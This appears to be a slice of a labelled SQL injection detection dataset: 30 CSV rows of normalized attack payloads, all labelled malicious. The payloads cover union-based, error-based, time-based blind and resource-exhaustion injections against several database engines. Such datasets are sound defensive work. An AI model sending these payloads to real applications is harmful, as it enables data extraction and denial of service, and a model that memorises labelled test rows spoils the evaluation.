row_index,payload_norm,label,sqli_type_hint
4320,"-9959"" ) or 4747 = dbms_utility.sqlid_to_sqlhash ( ( chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 4747 = 4747 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ) ) and ( ""vcwc"" = ""vcwc",1,
4321,"select * from generate_series ( 7610,7610,case when ( 7610 = 9416 ) then 1 else 0 end ) limit 1--",1,
4322,"1 where 4477 = 4477 union all select null,null,null,null,null,null,null,null,null,null--",1,
4323,"call regexp_substring ( repeat ( right ( char ( 3702 ) ,0 ) ,500000000 ) ,null ) and ( ( ( ""yzjl"" like ""yzjl",1,
4324,"1' ) ) and ( select 9067 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9067 = 9067,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and ( ( 'mymg' = 'mymg",1,
4325,"1 where 2751 = 2751 union all select null,null,null,null--",1,
4326,"1%"" ) ) ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ( ( ""%"" = """,1,
4327,1 ) and 3754 = ( select upper ( xmltype ( chr ( 60 ) ||chr ( 58 ) ||chr ( 113 ) ||chr ( 113 ) ||chr ( 112 ) ||chr ( 106 ) ||chr ( 113 ) || ( select ( case when ( 3754 = 3754 ) then 1 else 0 end ) from dual ) ||chr ( 113 ) ||chr ( 122 ) ||chr ( 118 ) ||chr ( 122 ) ||chr ( 113 ) ||chr ( 62 ) ) ) from dual ) and ( 3530 = 3530,1,
4328,"1 ) ) ) or 8156 = ( select count ( * ) from generate_series ( 1,5000000 ) ) --",1,
4329,1'|| ( select 'znba' where 8323 = 8323,1,
4330,waitfor delay '0:0:5' and ( ( ( 8981 = 8981,1,
4331,"-6948"" ) ) as ojjl where 1300 = 1300 or 6872 = 6872--",1,
4332,"select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 and ( ( 'bhlx' like 'bhlx",1,
4333,"1"" ) ) as ndbk where 5042 = 5042 and 8594 = ( select 8594 from pg_sleep ( 5 ) ) --",1,
4334,"-1917"" ) or 8571 = 8571--",1,
4335,"1"" and elt ( 2373 = 5817,5817 ) and ""rsdt"" = ""rsdt",1,
4336,1' ) ) ) and ( 8982 = 8027 ) *8027 and ( ( ( 'qkrv' = 'qkrv,1,
4337,select ( case when ( 2350 = 8682 ) then 2350 else 1/ ( select 0 ) end ) --,1,
4338,select pg_sleep ( 5 ) and ( '%' = ',1,
4339,"1' ) or elt ( 6272 = 6272,sleep ( 5 ) ) and ( 'yznd' like 'yznd",1,
4340,"1'|| ( select 'eayf' where 5431 = 5431 and char ( 120 ) ||char ( 106 ) ||char ( 117 ) ||char ( 85 ) = regexp_substring ( repeat ( right ( char ( 9981 ) ,0 ) ,5000000000 ) ,null ) ) ||'",1,
4341,"select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4# ljph",1,
4342,-3436 ) or 9281 = 3172,1,
4343,"-1907"" ) ) or 2782 = 3591",1,
4344,"1%"" and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
4345,"iif ( 2869 = 9448,1,1/0 )",1,
4346,"1%' ) and 8407 = ( select count ( * ) from generate_series ( 1,5000000 ) ) and ( '%' = '",1,
4347,"1'+ ( select 'kqnj' where 9483 = 9483 or elt ( 5873 = 5873,sleep ( 5 ) ) #",1,
4348,1%' ) ) ) and 4595 = 4595#,1,
4349,"1' or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) and 'aytf' like 'aytf",1,
